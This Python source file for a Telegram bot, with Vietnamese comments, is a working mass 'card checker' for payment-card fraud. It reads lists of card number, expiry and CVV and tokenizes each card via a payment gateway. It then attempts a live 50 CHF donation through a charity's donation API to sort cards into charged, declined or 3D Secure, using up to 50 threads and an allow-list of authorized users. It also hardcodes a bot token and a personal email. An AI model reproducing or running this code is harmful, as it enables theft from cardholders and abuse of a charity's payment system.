import telegram
from telegram.ext import Application, CommandHandler, MessageHandler, filters, Defaults
import requests
import json
import logging
import asyncio
import io
import re
import time
from telegram.constants import ParseMode
from concurrent.futures import ThreadPoolExecutor, as_completed

# --- CẤU HÌNH ---
# THÔNG TIN NHẠY CẢM ĐƯỢC GHI TRỰC TIẾP VÀO MÃ NGUỒN
BOT_TOKEN = "8383293948:AAEDVbBV05dXWHNZXod3RRJjmwqc2N4xsjQ"
ADMIN_ID = 5127429005
ADMIN_USERNAME = "@startsuttdow" # Thêm username của admin

# Tên file lưu danh sách user được phép
USER_FILE = "authorized_users.txt"

# --- Cấu hình logging ---
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)


# --- QUẢN LÝ USER ---
def load_users():
    """Tải danh sách ID người dùng được phép từ file."""
    try:
        with open(USER_FILE, "r") as f:
            return {int(line.strip()) for line in f if line.strip().isdigit()}
    except FileNotFoundError:
        return set()

def save_users(user_set):
    """Lưu danh sách ID người dùng vào file."""
    with open(USER_FILE, "w") as f:
        for user_id in user_set:
            f.write(str(user_id) + "\n")

# --- CÁC HÀM CỐT LÕI (check_card, create_progress_bar) ---
def check_card(line):
    parts = line.strip().split('|')
    if len(parts) != 4: return ('error', line, "Dòng không đúng định dạng cc|mes|ano|cvv")
    cc, mes, ano, cvv = parts
    if len(ano) == 2: ano = f"20{ano}"
    session = requests.Session()
    ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"
    session.headers.update({"User-Agent": ua})
    try:
        tokenize_url = "https://pay.datatrans.com/upp/payment/SecureFields/paymentField"
        tokenize_payload = { "mode": "TOKENIZE", "formId": "250731042226459797", "cardNumber": cc, "cvv": cvv, "paymentMethod": "ECA", "merchantId": "3000022877", "browserUserAgent": ua, "browserJavaEnabled": "false", "browserLanguage": "vi-VN", "browserColorDepth": "24", "browserScreenHeight": "1152", "browserScreenWidth": "2048", "browserTZ": "-420" }
        tokenize_headers = { "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Origin": "https://pay.datatrans.com", "Referer": "https://pay.datatrans.com/upp/payment/SecureFields/paymentField?mode=TOKENIZE&merchantId=3000022877&fieldName=cardNumber&formId=&placeholder=0000%200000%200000%200000&ariaLabel=Card%20number&inputType=tel&version=2.0.0&fieldNames=cardNumber,cvv&instanceId=8di84dqo8", "X-Requested-With": "XMLHttpRequest" }
        token_response = session.post(tokenize_url, data=tokenize_payload, headers=tokenize_headers, timeout=15)
        if token_response.status_code != 200: return ('error', line, f"Lỗi HTTP {token_response.status_code} khi Tokenize")
        try:
            token_data = token_response.json()
            transaction_id = token_data.get("transactionId")
            if not transaction_id:
                error_message = token_data.get("error", {}).get("message", "Không rõ lỗi")
                return ('error', line, f"Lỗi Tokenize: {error_message}")
        except json.JSONDecodeError: return ('error', line, "Phản hồi Tokenize không phải JSON")
        payment_url = "https://api.raisenow.io/payments"
        payment_payload = { "account_uuid": "28b36aa5-879a-438a-886f-434d78d1184d", "test_mode": False, "create_supporter": False, "amount": {"currency": "CHF", "value": 50}, "supporter": {"locale": "en", "first_name": "Minh", "last_name": "Nhat", "email": "minhnhat.144417@gmail.com", "email_permission": False, "raisenow_parameters": {"integration": {"opt_in": {"email": False}}}}, "raisenow_parameters": {"analytics": {"channel": "embed", "preselected_amount": "10000", "suggested_amounts": "[10000,15000,20000]", "user_agent": ua}, "solution": {"uuid": "f2166434-2e5c-4575-b32a-b4171f9a8b8c", "name": "Books for Change Spendenformular", "type": "donate"}, "product": {"name": "tamaro", "source_url": "https://donate.raisenow.io/hmyks?analytics.channel=embed&lng=en", "uuid": "self-service", "version": "2.15.3"}, "integration": {"donation_receipt_requested": "false"}}, "custom_parameters": {"campaign_id": "", "campaign_subid": ""}, "payment_information": {"brand_code": "eca", "cardholder": "Minh Nhat", "expiry_month": mes, "expiry_year": ano, "transaction_id": transaction_id}, "profile": "a8c1fc04-0647-4781-888b-8783d35ca2f5", "return_url": "https://donate.raisenow.io/hmyks?analytics.channel=embed&lng=en&rnw-view=payment_result" }
        payment_headers = { "Content-Type": "application/json", "Origin": "https://donate.raisenow.io", "Referer": "https://donate.raisenow.io/" }
        payment_response = session.post(payment_url, json=payment_payload, headers=payment_headers, timeout=20)
        response_text = payment_response.text
        if '"payment_status":"succeeded"' in response_text: return ('success', line, response_text)
        elif '"payment_status":"failed"' in response_text: return ('decline', line, response_text)
        elif '"3d_secure_2"' in response_text: return ('custom', line, response_text)
        else: return ('unknown', line, response_text)
    except requests.exceptions.RequestException as e: return ('error', line, f"Lỗi mạng: {e}")
    except Exception as e: return ('error', line, f"Lỗi không xác định: {e}")

def create_progress_bar(current, total, length=10):
    if total == 0: return "[                    ] 0%"
    fraction = current / total
    filled_len = int(length * fraction)
    bar = '█' * filled_len + '░' * (length - filled_len)
    return f"[{bar}] {int(fraction * 100)}%"

# --- CÁC LỆNH CHO MỌI NGƯỜI ---
async def start(update, context):
    user_id = update.effective_user.id
    welcome_text = (f"**Chào mừng bạn đến với Bot Checker!** 🤖\n\n"
                    f"🆔 ID Telegram của bạn là: `{user_id}`\n\n"
                    f"Để sử dụng chức năng check thẻ, bạn cần được Admin cấp quyền. Hãy gửi ID này cho Admin.\n\n"
                    f"Sử dụng lệnh `/help` để xem các lệnh có thể dùng.")
    await update.message.reply_text(welcome_text)

async def info(update, context):
    user_id = update.effective_user.id
    await update.message.reply_text(f"🆔 ID Telegram của bạn là: `{user_id}`\n\n(Hãy nhấn vào ID để sao chép)")

# --- LỆNH /help MỚI ---
async def help_command(update, context):
    user_id = update.effective_user.id
    
    # Tin nhắn cho Admin
    if user_id == ADMIN_ID:
        help_text = (
            "👑 **Trợ giúp dành cho Admin** 👑\n\n"
            "**Lệnh Quản lý:**\n"
            "- `/add <user_id>`: Thêm người dùng.\n"
            "- `/ban <user_id>`: Xóa người dùng.\n"
            "- `/show`: Hiển thị danh sách người dùng.\n\n"
            "**Lệnh Thành viên:**\n"
            "- `/massN <file>`: Bắt đầu check thẻ với N luồng.\n\n"
            "**Lệnh Công khai:**\n"
            "- `/start`: Khởi động bot.\n"
            "- `/info`: Lấy ID Telegram của bạn.\n"
            "- `/help`: Xem tin nhắn này."
        )
    # Tin nhắn cho thành viên được cấp phép
    elif user_id in load_users():
        help_text = (
            "👤 **Trợ giúp dành cho Thành viên** 👤\n\n"
            "Bạn đã được cấp quyền sử dụng các lệnh sau:\n\n"
            "**Lệnh Chính:**\n"
            "- `/massN <file>`: Gửi tệp .txt kèm chú thích này để bắt đầu check thẻ với N luồng (ví dụ: `/mass10`).\n\n"
            "**Lệnh Cơ bản:**\n"
            "- `/start`: Khởi động bot.\n"
            "- `/info`: Lấy ID Telegram của bạn.\n"
            "- `/help`: Xem tin nhắn này."
        )
    # Tin nhắn cho người dùng công khai
    else:
        help_text = (
            "👋 **Trợ giúp** 👋\n\n"
            "Các lệnh bạn có thể sử dụng:\n"
            "- `/start`: Khởi động bot và xem ID.\n"
            "- `/info`: Lấy lại ID Telegram của bạn.\n"
            "- `/help`: Xem tin nhắn này.\n\n"
            f"Để sử dụng các tính năng chính, vui lòng liên hệ Admin: {ADMIN_USERNAME}"
        )
    await update.message.reply_text(help_text)

# --- CÁC LỆNH ADMIN ---
async def add_user(update, context):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("⛔️ Lệnh này chỉ dành cho Admin.")
        return
    if not context.args:
        await update.message.reply_text(" cú pháp: `/add <user_id>`"); return
    try:
        user_to_add = int(context.args[0]); users = load_users()
        if user_to_add in users:
            await update.message.reply_text(f"ℹ️ Người dùng `{user_to_add}` đã có trong danh sách.")
        else:
            users.add(user_to_add); save_users(users)
            await update.message.reply_text(f"✅ Đã thêm người dùng `{user_to_add}` vào danh sách được phép.")
    except ValueError: await update.message.reply_text("❌ User ID không hợp lệ. Vui lòng nhập một dãy số.")

async def ban_user(update, context):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("⛔️ Lệnh này chỉ dành cho Admin."); return
    if not context.args:
        await update.message.reply_text(" cú pháp: `/ban <user_id>`"); return
    try:
        user_to_ban = int(context.args[0]); users = load_users()
        if user_to_ban in users:
            users.discard(user_to_ban); save_users(users)
            await update.message.reply_text(f"🗑 Đã xóa người dùng `{user_to_ban}` khỏi danh sách.")
        else:
            await update.message.reply_text(f"ℹ️ Không tìm thấy người dùng `{user_to_ban}` trong danh sách.")
    except ValueError: await update.message.reply_text("❌ User ID không hợp lệ. Vui lòng nhập một dãy số.")

async def show_users(update, context):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("⛔️ Lệnh này chỉ dành cho Admin."); return
    users = load_users()
    if not users:
        await update.message.reply_text("📭 Danh sách người dùng được phép hiện đang trống."); return
    message = "👥 **Danh sách các ID được phép sử dụng bot:**\n\n"
    for user_id in users: message += f"- `{user_id}`\n"
    await update.message.reply_text(message)

# --- HÀM XỬ LÝ CHÍNH (VỚI KIỂM TRA QUYỀN) ---
async def mass_check_handler(update, context):
    user_id = update.effective_user.id
    if user_id != ADMIN_ID and user_id not in load_users():
        await update.message.reply_text("⛔️ **Truy cập bị từ chối!**\nBạn không có quyền sử dụng chức năng này."); return
    if not update.message.document:
        await update.message.reply_text("Lỗi: Vui lòng gửi lệnh này kèm theo một tệp .txt."); return
    document = update.message.document
    if not document.file_name.lower().endswith('.txt'):
        await update.message.reply_text("⚠️ *Lỗi:* Vui lòng gửi một tệp tin `.txt`."); return
    caption = update.message.caption or "/mass1"; num_threads = 1
    match = re.match(r'/mass(\d+)', caption)
    if match:
        thread_count = int(match.group(1))
        if 0 < thread_count <= 50: num_threads = thread_count
        elif thread_count > 50: num_threads = 50
    try:
        file = await context.bot.get_file(document.file_id)
        file_content = (await file.download_as_bytearray()).decode('utf-8')
        lines = [line for line in file_content.splitlines() if line.strip()]
        if not lines: await update.message.reply_text("📂 Tệp của bạn trống."); return
        total_lines = len(lines)
        counts = {'success': 0, 'decline': 0, 'custom': 0, 'error': 0}
        processed_count = 0
        success_lines, custom_lines, decline_lines, debug_lines = [], [], [], []
        initial_text = f"⏳ **Khởi tạo...**\nChuẩn bị kiểm tra `{total_lines}` thẻ với `{num_threads}` luồng."
        status_message = await update.message.reply_text(text=initial_text)
        last_update_time = time.time()
        with ThreadPoolExecutor(max_workers=num_threads) as executor:
            future_to_line = {executor.submit(check_card, line): line for line in lines}
            for future in as_completed(future_to_line):
                processed_count += 1
                status, original_line, full_response = future.result()
                if status == 'success': counts['success'] += 1; success_lines.append(f"✅ CHARGED | {original_line}")
                elif status == 'decline': counts['decline'] += 1; decline_lines.append(f"❌ DECLINED | {original_line}")
                elif status == 'custom': counts['custom'] += 1; custom_lines.append(f"🔒 3D_SECURE | {original_line}")
                else: counts['error'] += 1; debug_lines.append(f"❔ DEBUG | {original_line} | DETAILS: {full_response}")
                current_time = time.time()
                if current_time - last_update_time > 2.0 or processed_count == total_lines:
                    progress_bar = create_progress_bar(processed_count, total_lines, length=20)
                    status_text = (f"**🚀 Đang kiểm tra...**\n{progress_bar}\n\n**Tiến độ:** `{processed_count}/{total_lines}`\n**Luồng:** `{num_threads}`\n\n✅ **Thành công:** `{counts['success']}`\n❌ **Từ chối:** `{counts['decline']}`\n🔒 **3D Secure:** `{counts['custom']}`\n❔ **Lỗi:** `{counts['error']}`")
                    try: await status_message.edit_text(text=status_text)
                    except telegram.error.BadRequest as e:
                        if "Message is not modified" not in str(e): logger.warning(f"Không thể cập nhật tin nhắn: {e}")
                    last_update_time = current_time
        final_summary_text = (f"📊 **Kiểm tra hoàn tất!**\n\n✅ **Thành công (Charged):** `{counts['success']}`\n❌ **Từ chối (Declined):** `{counts['decline']}`\n🔒 **Xác thực 3D (Custom):** `{counts['custom']}`\n❔ **Lỗi / Không xác định:** `{counts['error']}`\n\n📦 Đang chuẩn bị và gửi các tệp kết quả...")
        await status_message.edit_text(text=final_summary_text)
        async def send_file_if_not_empty(lines_list, filename):
            if lines_list:
                file_content = "\n".join(lines_list).encode('utf-8'); file_to_send = io.BytesIO(file_content)
                await context.bot.send_document(chat_id=update.effective_chat.id, document=file_to_send, filename=filename)
        await send_file_if_not_empty(success_lines, "charged.txt"); await send_file_if_not_empty(decline_lines, "declined.txt")
        await send_file_if_not_empty(custom_lines, "3d_secure.txt"); await send_file_if_not_empty(debug_lines, "debug.txt")
    except Exception as e:
        logger.error(f"Lỗi khi xử lý file: {e}")
        await update.message.reply_text(f"⛔️ **Lỗi nghiêm trọng!**\nĐã có sự cố xảy ra: `{e}`")

def main():
    """Hàm chính để chạy bot và đăng ký các handler."""
    defaults = Defaults(parse_mode=ParseMode.MARKDOWN)
    application = Application.builder().token(BOT_TOKEN).defaults(defaults).build()

    # Đăng ký các lệnh
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("info", info))
    application.add_handler(CommandHandler("help", help_command)) # Thêm lệnh help
    application.add_handler(CommandHandler("add", add_user))
    application.add_handler(CommandHandler("ban", ban_user))
    application.add_handler(CommandHandler("show", show_users))
    
    # Handler chính cho việc check thẻ
    application.add_handler(MessageHandler(filters.Document.TEXT & filters.CaptionRegex(r'^/mass(\d*)'), mass_check_handler))
    logger.info(f"Bot đang chạy với Admin ID: {ADMIN_ID}")
    application.run_polling()

if __name__ == '__main__':
    main()
